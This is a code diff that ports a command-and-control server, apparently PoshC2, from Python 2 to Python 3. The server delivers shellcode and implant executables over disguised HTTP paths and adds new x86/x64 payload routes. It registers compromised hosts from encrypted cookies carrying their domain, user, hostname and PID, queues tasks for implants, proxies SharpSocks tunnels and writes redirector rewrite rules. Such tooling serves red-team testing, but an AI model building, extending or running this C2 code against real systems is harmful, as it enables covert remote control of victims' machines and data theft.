@@ -1,7 +1,8 @@
 #!/usr/bin/env python
 
-import argparse, os, sys, re, datetime, time, base64, BaseHTTPServer, re, logging, ssl, signal, ssl, urllib2
-
+import argparse, os, sys, re, datetime, time, base64, re, logging, ssl, signal, ssl, traceback
+from urllib.request import urlopen
+from urllib.request import Request
 from Implant import Implant 
 from Tasks import newTask
 from Core import decrypt, encrypt, default_response, decrypt_bytes_gzip
@@ -17,11 +18,14 @@ from Cert import create_self_signed_cert
 from Help import logopic
 from Utils import validate_sleep_time, randomuri, gen_key
 
-from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
-from SocketServer import ThreadingMixIn
+#from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
 import threading
 
-class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class MyHandler(BaseHTTPRequestHandler):
 
     def signal_handler(signal, frame):
       sys.exit(0)
@@ -77,8 +81,8 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         elif any(UriPath in s for s in sharplist):
           try:
             open("%swebserver.log" % ROOTDIR, "a").write("[+] Making GET connection to SharpSocks %s%s\r\n" % (SocksHost,UriPath))
-            r=urllib2.Request("%s%s" % (SocksHost,UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie':'%s' % s.cookieHeader, 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
-            res = urllib2.urlopen(r)
+            r=Request("%s%s" % (SocksHost,UriPath), headers={'Accept-Encoding': 'gzip', 'Cookie':'%s' % s.cookieHeader, 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36'})
+            res = urlopen(r)
             sharpout = res.read()
             s.send_response(200)
             s.send_header("Content-type", "text/html")
@@ -88,6 +92,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             s.wfile.write(sharpout)
           except Exception as e:
             open("%swebserver.log" % ROOTDIR, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n" % (SocksHost,UriPath))
+            open("%swebserver.log" % ROOTDIR, "a").write("[-] Error with SharpSocks: %s\r\n" % (e))
             print (Colours.RED+"Error with SharpSocks connection - is SharpSocks running"+Colours.END)
 
         elif ("%s_bs" % QuickCommandURI) in s.path:
@@ -108,7 +113,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.end_headers()
           s.wfile.write(content)
 
-        elif ("%spotal" % QuickCommandURI) in s.path:
+        elif ("%ss/86/portal" % QuickCommandURI) in s.path:
           filename = "%sSharp_v4_x86_Shellcode.bin" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
@@ -118,8 +123,28 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.end_headers()
           s.wfile.write(content)
 
-        elif ("%slogin" % QuickCommandURI) in s.path:
+        elif ("%ss/64/portal" % QuickCommandURI) in s.path:
           filename = "%sSharp_v4_x64_Shellcode.bin" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          content = base64.b64encode(content)
+          s.send_response(200)
+          s.send_header("Content-type", "text/html")
+          s.end_headers()
+          s.wfile.write(content)
+
+        elif ("%sp/86/portal" % QuickCommandURI) in s.path:
+          filename = "%sPosh_v4_x86_Shellcode.bin" % (PayloadsDirectory)
+          with open(filename, 'rb') as f:
+            content = f.read()
+          content = base64.b64encode(content)
+          s.send_response(200)
+          s.send_header("Content-type", "text/html")
+          s.end_headers()
+          s.wfile.write(content)
+
+        elif ("%sp/64/portal" % QuickCommandURI) in s.path:
+          filename = "%sPosh_v4_x64_Shellcode.bin" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
           content = base64.b64encode(content)
@@ -141,13 +166,13 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           filename = "%saes.py" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
-            content = "a"+"".join("{:02x}".format(ord(c)) for c in content)
+            content = "a"+"".join("{:02x}".format(c) for c in content)
           s.send_response(200)
           s.send_header("Content-type", "text/plain")
           s.end_headers()
-          s.wfile.write(content)
+          s.wfile.write(bytes(content,"utf-8"))
 
-        elif ("%s_ex" % QuickCommandURI) in s.path:
+        elif ("%s_ex86" % QuickCommandURI) in s.path:
           filename = "%sPosh32.exe" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
@@ -156,7 +181,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           s.end_headers()
           s.wfile.write(content)
 
-        elif ("%s_ex6" % QuickCommandURI) in s.path:
+        elif ("%s_ex64" % QuickCommandURI) in s.path:
           filename = "%sPosh64.exe" % (PayloadsDirectory)
           with open(filename, 'rb') as f:
             content = f.read()
@@ -191,10 +216,9 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
             Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
-            user = User.decode("utf-8")
-            if "\\" in user:
-              user = user[user.index("\\") + 1:]
-            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), user, Hostname.decode("utf-8"), Arch, PID, Proxy)
+            if "\\" in User:
+              User = User[User.index("\\") + 1:]
+            newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
             newImplant.save()
             newImplant.display()
             responseVal = encrypt(KEY, newImplant.SharpCore)
@@ -208,7 +232,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             decCookie = decrypt(KEY, cookieVal)
             IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
             User,Domain,Hostname,Arch,PID,Proxy = decCookie.split(";")
-            newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"), User.decode("utf-8"), Hostname.decode("utf-8"), Arch, PID, Proxy)
+            newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), Arch, PID, Proxy)
             newImplant.save()
             newImplant.display()
             responseVal = encrypt(KEY, newImplant.PythonCore)
@@ -220,37 +244,37 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           else:
             try:
               cookieVal = (s.cookieHeader).replace("SessionID=","")
-              decCookie = decrypt(KEY, cookieVal)
+              decCookie = decrypt(KEY.encode("utf-8"), cookieVal)
+              decCookie = str(decCookie)
               Domain,User,Hostname,Arch,PID,Proxy = decCookie.split(";")
               IPAddress = "%s:%s" % (s.client_address[0],s.client_address[1])
-              user = User.decode("utf-8")
-              if "\\" in user:
-                user = user[user.index('\\') + 1:]
-              newImplant = Implant(IPAddress, implant_type, Domain.decode("utf-8"),user, Hostname.decode("utf-8"), Arch, PID, Proxy)
+              if "\\" in str(User):
+                User = User[str(User).index('\\') + 1:]
+              newImplant = Implant(IPAddress, implant_type, str(Domain),str(User), str(Hostname), Arch, PID, Proxy)
               newImplant.save()
               newImplant.display()
               newImplant.autoruns()
               responseVal = encrypt(KEY, newImplant.PSCore)
-
               s.send_response(200)
               s.send_header("Content-type", "text/html")
               s.end_headers()
               s.wfile.write(responseVal)
             except Exception as e:
               print ("Decryption error: %s" % e)
+              traceback.print_exc()
               s.send_response(404)
               s.send_header("Content-type", "text/html")
               s.end_headers()
-              s.wfile.write(HTTPResponse)
+              s.wfile.write(bytes(HTTPResponse,"utf-8"))
         else:
           s.send_response(404)
           s.send_header("Content-type", "text/html")
           s.end_headers()
           HTTPResponsePage = select_item("HTTPResponse", "C2Server")
           if HTTPResponsePage:
-            s.wfile.write(HTTPResponsePage)
+            s.wfile.write(bytes(HTTPResponsePage,"utf-8"))
           else:
-            s.wfile.write(HTTPResponse)
+            s.wfile.write(bytes(HTTPResponse,"utf-8"))
 
     def do_POST(s):
         """Respond to a POST request."""
@@ -281,10 +305,6 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 print ("The multicmd errored: ")
                 print (rawoutput)
                 print (Colours.GREEN)
-                s.send_response(200)
-                s.send_header("Content-type", "text/html")
-                s.end_headers()
-                s.wfile.write(default_response())
                 return
               taskId = str(int(decCookie.strip('\x00')))
               taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
@@ -389,7 +409,7 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 print (Colours.GREEN)
                 print (outputParsed + Colours.END)
         except Exception as e:
-          # print e
+          # print (e)
           # traceback.print_exc()
           pass 
           
@@ -405,19 +425,20 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           if any(UriPath in s for s in sharplist):
             try:
               open("%swebserver.log" % ROOTDIR, "a").write("[+] Making POST connection to SharpSocks %s%s\r\n" % (SocksHost,UriPath))
-              r=urllib2.Request("%s%s" % (SocksHost,UriPath), headers={'Cookie':'%s' % s.cookieHeader})
-              res = urllib2.urlopen(r, post_data)
+              r=Request("%s%s" % (SocksHost,UriPath), headers={'Cookie':'%s' % s.cookieHeader})
+              res = urlopen(r, post_data)
               s.send_response(200)
               s.send_header("Content-type", "text/html")
               s.end_headers()
               s.wfile.write(res.read())
             except Exception as e:
               open("%swebserver.log" % ROOTDIR, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n" % (SocksHost,UriPath))
+              open("%swebserver.log" % ROOTDIR, "a").write("[-] Error with SharpSocks: %s\r\n" % (e))
               print (Colours.RED+"Error with SharpSocks connection - is SharpSocks running"+Colours.END)
 
           else:
             s.send_response(200)
-            s.send_header("Content-type", "text/html")
+            s.send_header("Content-type", "text/html2")
             s.end_headers()
             s.wfile.write(default_response())
 
@@ -447,7 +468,7 @@ if __name__ == '__main__':
       if (C2[1] == HostnameIP):
         qstart = "%squickstart.txt" % (ROOTDIR)
         if os.path.exists(qstart):
-          with open(qstart, 'rb') as f:
+          with open(qstart, 'r') as f:
             print (f.read())
       else:
         print ("Error different IP so regenerating payloads")
@@ -489,10 +510,10 @@ if __name__ == '__main__':
         print("Invalid DefaultSleep in config, please specify a time such as 50s, 10m or 1h")
         print(Colours.GREEN)
         sys.exit(1)
-      setupserver(HostnameIP,gen_key(),DomainFrontHeader,DefaultSleep,KillDate,HTTPResponse,ROOTDIR,ServerPort,QuickCommand,DownloadURI,"","","",Sounds,APIKEY,MobileNumber,URLS,SocksURLS,Insecure,UserAgent,Referrer,APIToken,APIUser,EnableNotifications)
+      setupserver(HostnameIP,gen_key().decode("utf-8"),DomainFrontHeader,DefaultSleep,KillDate,HTTPResponse,ROOTDIR,ServerPort,QuickCommand,DownloadURI,"","","",Sounds,APIKEY,MobileNumber,URLS,SocksURLS,Insecure,UserAgent,Referrer,APIToken,APIUser,EnableNotifications)
       rewriteFile = "%s/rewrite-rules.txt" % directory
-      print "Creating Rewrite Rules in: " + rewriteFile
-      print ""
+      print ("Creating Rewrite Rules in: " + rewriteFile)
+      print ("")
       rewriteHeader=["RewriteEngine On", "SSLProxyEngine On", "SSLProxyCheckPeerCN Off", "SSLProxyVerify none", "SSLProxyCheckPeerName off", "SSLProxyCheckPeerExpire off","# Change IPs to point at C2 infrastructure below","Define PoshC2 10.0.0.1", "Define SharpSocks 10.0.0.1"]
       rewriteFileContents = rewriteHeader + urlConfig.fetchRewriteRules() + urlConfig.fetchSocksRewriteRules()
       with open(rewriteFile,'w') as outFile:
